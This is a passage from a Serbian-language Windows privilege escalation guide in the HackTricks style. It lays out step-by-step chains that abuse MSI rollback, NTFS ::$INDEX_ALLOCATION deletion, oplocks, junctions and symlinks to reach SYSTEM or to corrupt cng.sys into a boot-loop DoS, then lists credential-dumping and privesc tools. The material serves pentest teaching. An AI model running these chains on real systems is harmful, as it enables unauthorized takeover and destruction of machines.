        - Vrati vašu `.rbf` datoteku (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Ubacite lažni `.rbf` koji sadrži **zlonamerni payload DLL na SYSTEM nivou**.

- Korak 12: Pokrenite rollback
    - Pošaljite signal za sinhronizaciju kako bi se installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** podešena je da **namerno obori instalaciju** u poznatom trenutku.
    - Time se pokreće **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada imate **zlonamerni DLL na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdan **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste preoteli.
    - **Bum**: Vaš kod se izvršava **kao SYSTEM**.


### Od Arbitrary File Delete/Move/Rename do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **celu fasciklu** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **proizvoljno brisanje datoteka**?

Mogli biste da iskoristite **NTFS internals**: svaka fascikla ima skriveni alternate data stream pod nazivom:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **indeksne metapodatke** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitiv ne dozvoljava da brišete proizvoljne datoteke/fascikle, ali vam **dozvoljava brisanje *sadržaja* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite fasciklu mamac i datoteku
- Napravite: `C:\temp\folder1`
- U njoj napravite: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr. `SilentCleanup`)
- Ovaj proces skenira fascikle (npr. `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno da brišete `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok koji čuva metapodatke fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM-a.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitivu koja vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows pri pokretanju ne uspeva da učita stvarni drajver.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši se ili zaustavlja pokretanje**.
- **Nema rezervnog mehanizma** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja datoteka / DoS-a pri pokretanju

Kada **privilegovani servis** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije koja može da se menja**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** kako biste privilegovani upis pretvorili u proizvoljno prepisivanje (čak i **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Preduslovi**
- Napadač može da menja konfiguraciju u kojoj je sačuvana ciljna putanja (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali odredište privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše zapisnik (npr. administrator pokrene „pošalji testni SMS“). Upisivanje sada završava u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisano odredište (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita putanju do izmenjenog upravljačkog programa → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti radi upisivanja.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys`, može biti prvo pokušano njeno učitavanje, što je čini pouzdanim odredištem za DoS pomoću oštećenih podataka.



## **Od visokog integriteta do SYSTEM**

### **Nova usluga**

Ako već radite u procesu visokog integriteta, **putanja do SYSTEM-a** može biti jednostavna: samo **kreirajte i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Kada kreirate binarnu datoteku servisa, proverite da li je servis validan ili da li binarna datoteka brzo obavlja potrebne radnje, jer će biti prekinuta za 20s ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa High Integrity možete pokušati da **omogućite AlwaysInstallElevated stavke u registru** i da **instalirate** reverse shell pomoću _**.msi**_ omotača.\
[Više informacija o ključevima registra koji su uključeni i o tome kako da instalirate _.msi_ paket možete pronaći ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilegija do System-a

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do Full Token privilegija

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima High Integrity), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću SeDebug privilegije, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika se obično koristi za **izbor bilo kog procesa koji se izvršava kao SYSTEM i ima sve privilegije tokena** (_da, možete pronaći SYSTEM procese koji nemaju sve privilegije tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju privilegija u `getsystem`. Tehnika podrazumeva **kreiranje pipe-a, a zatim kreiranje/zloupotrebu servisa koji upisuje u taj pipe**. Zatim će **server** koji je kreirao pipe koristeći privilegiju **`SeImpersonate`** moći da **imitira token** klijenta pipe-a (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o named pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa high integrity na System pomoću named pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija, a uz to ga je **mnogo lakše izvesti iz procesa sa high integrity**, jer će imati **dozvole za pisanje** u fascikle koje se koriste za učitavanje dll-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System-a**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do svih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**pogledajte ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovan.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**pogledajte ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Detektovan.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na celom domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (mora da se kompajlira pomoću VisualStudio) ([**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Ispituje host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (mora da se kompajlira) **(**[**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz velikog broja softvera (prekompajlirana exe datoteka na GitHub-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirana izvršna datoteka na GitHub-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ove objave (ne zahteva accesschk za ispravan rad, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate da kompajlirate pomoću odgovarajuće verzije .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da uradite sledeće:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - radionica za lokalnu eskalaciju privilegija na Windows / Linux sistemima](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je nova crna boja (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - Potpuni OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje akreditiva hMailServer-a → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak stringe formata + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Fox-om: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću: zloupotreba simboličkih veza u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: opasna rezolucija modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - rešeni izazovi iz C/C++ kontrolne liste](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - binarne datoteke za otmicu servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own uz Microslop: ulančavanje CLDFLT-a i DirectX kernel race condition-a za Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da vlada svima: primitiva za potpuno čitanje/pisanje u Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnih brisanja datoteka za eskalaciju privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - kod za exploit-e FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS napadi, 2. deo: CVE-2020-1013, jednodnevna ranjivost za lokalnu eskalaciju privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - izdvajanje privatnih SSH ključeva iz SSH agenta u Windows-u 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – pretvaranje serverskih sistema za ažuriranje u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
